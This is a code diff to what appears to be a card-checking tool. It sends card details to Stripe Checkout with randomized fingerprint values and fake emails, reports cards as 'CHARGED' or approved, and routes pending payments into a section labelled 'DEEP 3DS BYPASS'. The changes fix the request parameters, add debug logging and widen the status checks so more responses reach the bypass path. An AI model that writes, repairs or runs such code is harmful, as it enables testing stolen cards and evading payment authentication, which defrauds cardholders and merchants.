@@ -1626,6 +1626,8 @@ export async function registerRoutes(
       const jsChecksum = randomHex(50);
       const rvTimestamp = randomHex(120);
 
+      // Note: Stripe API does not allow both payment_method AND customer_data together
+      // When using payment_method, customer_data should NOT be included
       const confirmParams: Record<string, string> = {
         eid: "NA",
         payment_method: pmId,
@@ -1635,14 +1637,6 @@ export async function registerRoutes(
         "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
         "last_displayed_line_item_group_details[total_discount_amount]": "0",
         "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
-        "customer_data[name]": addr.name,
-        "customer_data[email]": randEmail,
-        "customer_data[phone]": addr.phone,
-        "customer_data[address][line1]": addr.line1,
-        "customer_data[address][city]": addr.city,
-        "customer_data[address][state]": addr.state,
-        "customer_data[address][postal_code]": addr.postal_code,
-        "customer_data[address][country]": addr.country,
         expected_payment_method_type: "card",
         guid,
         muid,
@@ -1686,7 +1680,13 @@ export async function registerRoutes(
       };
 
       try {
+        // Debug: log raw response
+        console.log("[DEBUG] Confirm response status:", step5.status);
+        console.log("[DEBUG] Confirm response body length:", step5.body.length);
+        console.log("[DEBUG] Confirm response body (first 1500 chars):", step5.body.substring(0, 1500));
+        
         const confirmJson = JSON.parse(step5.body);
+        console.log("[DEBUG] Parsed confirmJson keys:", Object.keys(confirmJson));
 
         if (confirmJson.error) {
           const errMsg = confirmJson.error.message || "Declined";
@@ -1710,15 +1710,26 @@ export async function registerRoutes(
         }
 
         const status = confirmJson.status || "";
-        if (status === "succeeded" || status === "processing") {
+        
+        // When status is "open", check the payment_intent status inside
+        let effectiveStatus = status;
+        if (status === "open" && confirmJson.payment_intent) {
+          const pi = typeof confirmJson.payment_intent === "object" ? confirmJson.payment_intent : null;
+          if (pi && pi.status) {
+            console.log("[DEBUG] Checkout open, payment_intent status:", pi.status);
+            effectiveStatus = pi.status;
+          }
+        }
+        
+        if (effectiveStatus === "succeeded" || effectiveStatus === "processing") {
           detachPM();
           return res.json({ card: data, status: "CHARGED", message: `Payment ${status}!`, approved: true, gateway: "Stripe Checkout", time: elapsed, fingerprint: fpMeta || undefined, chargeAmount: expectedAmount, currency, ipInfo });
-        } else if (status === "complete") {
+        } else if (effectiveStatus === "complete") {
           detachPM();
           return res.json({ card: data, status: "CHARGED", message: "Payment complete!", approved: true, gateway: "Stripe Checkout", time: elapsed, fingerprint: fpMeta || undefined, chargeAmount: expectedAmount, currency, ipInfo });
-        } else if (status === "requires_action" || (confirmJson.id && confirmJson.id.startsWith("ppage_"))) {
+        } else if (effectiveStatus === "requires_action" || effectiveStatus === "requires_confirmation" || status === "open" || (confirmJson.id && confirmJson.id.startsWith("ppage_"))) {
           // ===== DEEP 3DS BYPASS =====
-          console.log("[3DS] Status:", status, "| PI:", !!confirmJson.payment_intent, "| SI:", !!confirmJson.setup_intent);
+          console.log("[3DS] Status:", status, "| effectiveStatus:", effectiveStatus, "| PI:", !!confirmJson.payment_intent, "| SI:", !!confirmJson.setup_intent);
           let piId = "";
           let piClientSecret = "";
           let threeDsUrl = "";
@@ -1902,7 +1913,8 @@ export async function registerRoutes(
           detachPM();
           return res.json({ card: data, status: "UNKNOWN", message: `Status: ${status || "unknown"}`, approved: false, gateway: "Stripe Checkout", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
         }
-      } catch {
+      } catch (parseErr: any) {
+        console.log("[ERROR] Parse/process error:", parseErr.message || parseErr);
         detachPM();
         return res.json({ card: data, status: "ERROR", message: "Invalid confirm response", gateway: "Stripe Checkout", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
       }
